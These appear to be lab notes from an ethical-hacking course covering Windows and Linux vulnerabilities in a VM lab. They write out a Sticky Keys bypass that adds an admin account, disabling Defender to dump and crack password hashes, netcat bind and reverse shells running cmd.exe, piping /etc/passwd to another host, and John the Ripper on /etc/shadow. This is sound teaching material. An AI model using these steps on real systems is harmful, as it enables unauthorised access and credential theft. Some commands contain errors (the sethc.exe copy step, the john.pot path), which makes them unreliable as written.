# EHD Practical 9 - OS Vulnerabilities

###### tags: #EHD 

## Table of Contents
```toc
```

## Windows Vulnerabilities
### View Shared Resources on Windows Systems
**On Win10 VM**
1. Repeat `net view \\Win-10 IP` to show a list of available shared folders
2. Repeat the `net view` command on another Win10 VM
3. Run `net use Z: \\Win10-IP\shared` to map shared folder to Z drive
4. Run `dir Z: \\Win10-IP\shared`
5. Type `nbtstat /?` for help
6. Type `nbtstat -a Win10-IP`

### OpenVAS
> OpenVAS  is an open source vulnerability assessment software like Nessus

1. Power on OpenVAS image
2. At the login screen, note the IP address of the OpenVAS image
3. On web browser on another VM, browser to the OpenVAS IP and add exception for the security certificate
4. Login to the Greenbone Security Manager with username `admin` and password `admin`
5. Power on and use web-server2 as the target and take note of its IP address
6. In the Web Browser, in the Greenbone Security Manager, under the Configuration menu, select **Targets**
7. Click on the star icon on the top left corner to create a **New Target**
8. Check that the Manual radio button is selected and enter IP address of web-server2
9. Click **Create**
10. Under the Scans menu, select Tasks
11. Click on the star icon in the top left corner to create a **New Task**
12. Enter a name for a task
13. For Scan Config, choose the default **Full and fast**
14. Click **Create**
15. Under Actions, click on the Play icon to start the scan
16. When the scan is completed, the status will be updated to **Done**
17. Under **Reports**, click to view the report to view the vulnerabilities found
18. When clicking on the vulnerability, details will be displayed
19. Under the **Configuration** menu, select Scan Configs
20. Click on Full and fast to see what type of NVTs (Network Vulnerability Tests) are included in the scan
21. To shut down OpenVAS, select the **Maintenance** and choose **Power**

### SMB/CIFS
> Server Message Block (SMB) or CIFS (Common Internet File System) can be used to share resources between computers running Windows or Linux

**On Kali VM**
1. To list out shared folders on a remote system, use the `smbclient` command (Use `-U` option to specify Windows 10 user account)
```
smbclient -L Win10-IP -U admin 
```
2. Start Wireshark to capture the network traffic
3. Use the following command to connect shared folder on Win10:
```
smbclient //Win10-IP/shared
```
4. Press <kbd>Enter</kbd> if asked for password
5. If there is a `NT_STATUS_ACCESS_DENIED` message, specify Win10 username
```
smbclient //Win10-IP/shared -U admin
``` 
6. At the SMB prompt, type `ls` to list contents of the share
7. Use the `get` command to download the text file to Kali
```
get test.txt
```
8. Type exit to end the connection
9. Stop Wireshark. View the TCP packets with the SMB protocol connecting to port 445 on Win10

### Accessing Windows without Logging In (Sticky Keys)
1. Shutdown Win10 VM
2. Use ISO image file 

![](https://i.imgur.com/dCGpCq9.png)

3. Start the Win10 VM. When VMWare word appears, press <kbd>F2</kbd> to enter BIOS setup utility
4. In the Boot menu, select CD-ROM Drive and bring it to the top
5. Press <kbd>F10</kbd> to save and exit
6. Win10 VM will boot into Kali using the ISO file
7. Login with username `root` and password `toor` (or username `kali` and password `kali`)
8. Type `fdisk -l` to view the Windows partition
9. Windows partition may be listed as `/dev/sda2`
10. Type `mkdir /mnt/sda2` to create a mount point
11. Type `mount /dev/sda2/ /mnt/sda2` to mount the Windows partition
12. Type `ls /mnt/sda2` to list contents of the Windows partition
13. Type `cd /mnt/sda2/Windows/System32`
14. Type `cp sethc.exe sethc.exe.bak` to make a copy of the `sethc.exe` file
15. Type `cp cmd.exe sethc.exe.bak` to overwrite the original file with the Command Prompt executable
16. Type `init 0` to shutdown
17. Set the CD/DVD back to "Use Physical Drive"
18. Start up the Win10 VM
19. At the login screen, press the shift key 5 times quickly
20. In the Command Prompt, type:
```
net user hacker 1qwer$#@! /add
net localgroup administrators hacker /add
exit
```

21. Restart the Win10 VM to refresh and login to the newly added user

### Windows Password Cracking
> Ophcrack is an open source Windows password cracker that uses rainbow tables
> - May not work with antivirus software which can flag it as a Trojan

**On Win10 VM**
<u>Using fgdump</u>
1. Disable the Windows Defender to prevent anti-malware from detecting fgdump
2. Create a folder `C:\ophcrack` for storing the Ophcrack files
3. Download the fgdump program and copy it into `C:\ophcrack`
4. Launch the Command Prompt and move to the following directory:
```
cd C:\ophcrack\fgdump-2.1.0
```
5. On the Command Prompt, run fgdump to dump out hashed passwords of the current system
6. The hashed passwords will be stored on the file `127.0.0.1.pwdump`
7. Download the Ophcrack installation file and Vista Free rainbow tables
8. Run the x64 version of `ophcrack.exe`
9. Click on **Tables** and select the downloaded folder with Vista Free rainbow tables
10. On the **Load** menu, select the PWDUMP file
11. Click **Crack** to start the password cracking

![](https://i.imgur.com/MnSXD0u.png)

### Netcat
> A backdoor is a program installed secretly on the victim's computer that opens a port for the attacker
> Netcat will be used to open a port on the victim's computer

**On Win10 VM**
1. Install nmap for Windows
2. On the Command Prompt, run Netcat with the help option to see the available options
```
ncat -h
```
3. Run ncat to listen on port 8989. If anyone connects to that port, it will run the command prompt program
```
ncat -l -p 8989 -e cmd.exe
```

**On Kali VM**
4. Run netcat to connect to the listening netcat on Win10 on port 8989
```
nc Win10-IP 8989
```
5. If the connection is successful, you are connected to the Command Prompt of the Win10 VM
6. To close the session, type `exit`

<u>Transferring a file:</u>
**On Win10 VM**
7. On Win10 VM, run netcat to listen on port 8082 and direct all incoming data to a file
```
ncat -l -p 8082 > newfile.txt
```

**On Kali VM**
8. Run netcat to connect to the listening netcat on Win10 on port 8082 and direct contents of a file to it
```
nc Win10-IP 8082 < /etc/passwd
```
9. After a few seconds, press <kbd>Ctrl</kbd>+<kbd>C</kbd> to close netcat on Kali
10. Check the contents of `newfile.txt` on Win10 VM

<u>Creating  a reverse shell:</u>
**On Kali VM**
1. Run netcat to connect to the listening netcat on Win10 on port 1234
```
nc Win10-IP 1234
```

**On Win10 VM**
2. Run netcat to connect to the listening port on Kali on port 1234 and execute the command shell
```
ncat -e cmd.exe Kali-IP 1234
```

**On Kali VM**
3. On Kali, the Win10 VM can be accessed
4. To close the session, type `exit`

<u>Banner Grabbing:</u>
5. To get information on the service running on a certain port, run the following command:
```
nc -v -b Win10-IP port_number
```

6. Press <kbd>Ctrl</kbd>+<kbd>C</kbd>

## Linux Vulnerabilities
### Connecting to a SSH Server and Disabling Remote Root Login using PuTTY
**On web-server2 VM**
1. By default, the web server does not allow user root to do a remote login
2. Edit the SSH service config file `/etc/ssh/sshd_config` and look for the setting `PermitRootLogin`. It is set to "no" so users are not permitted to do an SSH connection

**On Kali VM**
3. Try to SSH to web-server2 as user `root` - It should be unsuccessful
```
ssh root@web-server2-IP
```

4. SSH as user `student00` (password: `student00`)
```
ssh student00@web-server2-IP
```
5. Once logged in as `student00`, type `su -` to switch to the root account

**On web-server2 VM**
6. Edit the following two files to allow only one IP address (Win10 VM) to connect the SSH service
7. On `/etc/hosts.deny`, add the following:
```
sshd: ALL
```
8. On `/etc/hosts.allow`, add the following:
```
sshd: Win10-IP
```
9. Restart the SSH service:
```
systemctl restart sshd
```
10. Remove the lines  and restart the SSH service to undo all the changes

### Using John the Ripper
**On Kali VM**
1. To crack the passwords in the current Linux shadow file, run the following command:
```
sudo john /etc/shadow
```
2. Run the following command to use John the Ripper with the `crypt` format to crack the hashed passwords
```
sudo john --format=crypt /etc/shadow
```
3. A directory called `.john` is created in the `/root` directory. Passwords that are cracked successfully are listed in a file called `john.pot`
```
sudo cat /root/john/john.pot
```
4. To view the cracked passwords using John the Ripper:
```
sudo john --show /etc/shadow
```
5. View the contents of the password list available in the John the Ripper directory
```
less /usr/share/john/password.lst
wc -l  /usr/share/john/password.lst
```
6. View the other word lists available on Kali:
```
sudo find / -name *wordlist*
```
7. To run John the Ripper with the `rockyou.txt` password list, run the following command:
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt /etc/shadow
```
8. To find the Process ID of the John the Ripper process:
```
sudo ps -ef | grep john
```
9. Use the kill command to send a USR1 signal to the John the Ripper process